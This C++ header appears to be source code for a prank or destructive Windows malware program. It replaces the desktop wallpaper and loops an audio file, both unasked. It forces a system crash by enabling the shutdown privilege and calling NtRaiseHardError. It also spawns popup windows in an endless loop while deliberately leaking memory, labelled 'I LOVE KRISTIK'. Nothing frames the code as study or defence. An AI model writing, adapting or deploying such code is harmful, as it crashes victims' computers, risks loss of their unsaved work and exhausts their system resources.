#pragma once
#pragma comment(lib, "winmm.lib")
#include <Windows.h>
#include <string>
#include "resource.h"
#include <mmsystem.h>
#include <winternl.h>

HINSTANCE kris;
HINSTANCE hMain;
HWND hWnd2;
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);


using namespace std;


void OverrideWallpaper() {
	WCHAR* buffer = new WCHAR[260];
	const WCHAR name[13] = L"LOCALAPPDATA";
	DWORD desktop = GetEnvironmentVariable(name, buffer, 260);
	std::wstring fullpath1;
	fullpath1 += buffer;
	fullpath1 += L"\\img.jpg";
	LPCWSTR cont1 = fullpath1.c_str();
	HINSTANCE hInstance = kris;
	HRSRC hResInfo = FindResource(hInstance, MAKEINTRESOURCE(IDR_JPG1), TEXT("jpg"));
	HGLOBAL hRes = LoadResource(hInstance, hResInfo);
	LPVOID memRes = LockResource(hRes);
	DWORD sizeRes = SizeofResource(hInstance, hResInfo);
	HANDLE hFile = CreateFile(cont1, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwWritten = 0;
	WriteFile(hFile, memRes, sizeRes, &dwWritten, NULL);
	CloseHandle(hFile);
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)cont1, SPIF_UPDATEINIFILE);
}

void raiseError() {
	BOOLEAN bEnabled;
	ULONG uResp;
	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
	pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
	NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
}

void playMusic() {
	WCHAR* buffer = new WCHAR[260];
	const WCHAR name[13] = L"LOCALAPPDATA";
	DWORD desktop = GetEnvironmentVariable(name, buffer, 260);
	std::wstring fullpath1;
	fullpath1 += buffer;
	fullpath1 += L"\\music.wav";
	LPCWSTR cont1 = fullpath1.c_str();
	HINSTANCE hInstance = kris;
	HRSRC hResInfo = FindResource(hInstance, MAKEINTRESOURCE(IDR_WAVE1), TEXT("WAVE"));
	HGLOBAL hRes = LoadResource(hInstance, hResInfo);
	LPVOID memRes = LockResource(hRes);
	DWORD sizeRes = SizeofResource(hInstance, hResInfo);
	HANDLE hFile = CreateFile(cont1, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwWritten = 0;
	WriteFile(hFile, memRes, sizeRes, &dwWritten, NULL);
	CloseHandle(hFile);
	BOOL sound;
	sound = PlaySound(cont1, NULL, SND_FILENAME | SND_LOOP | SND_ASYNC);
}

LRESULT CALLBACK DialogProc(HWND hWnd, UINT msg, WPARAM wp, LPARAM lp) {
	switch (msg) {
	case WM_CLOSE:
		DestroyWindow(hWnd);
		break;
	default:
		return DefWindowProcW(hWnd, msg, wp, lp);
	}
}

void registerDialogClass(HINSTANCE hInst) {
	WNDCLASSW dialog = { 0 };
	dialog.hbrBackground = (HBRUSH)COLOR_WINDOW;
	dialog.hCursor = LoadCursor(NULL, IDC_WAIT);
	dialog.hInstance = hInst;
	dialog.lpszClassName = L"popup";
	dialog.lpfnWndProc = DialogProc;

	RegisterClassW(&dialog);
}
// this one is a pain in the ass so im not gonna add text.
// just deal with an empty dialog and memory snatcher
void displayDialog(HWND hWnd) {
	int x = rand() % 1920;
	int y = rand() % 1080;
	char* eater;
	eater = (char*)malloc(9999999);
	CreateWindowW(L"popup", L"I LOVE KRISTIK", WS_VISIBLE | WS_OVERLAPPEDWINDOW, x, y, 200, 200, hWnd, NULL, NULL, NULL);
}

void showDialog() {
	registerDialogClass(hMain);
	while (true) {
		displayDialog(hWnd2);
	}
}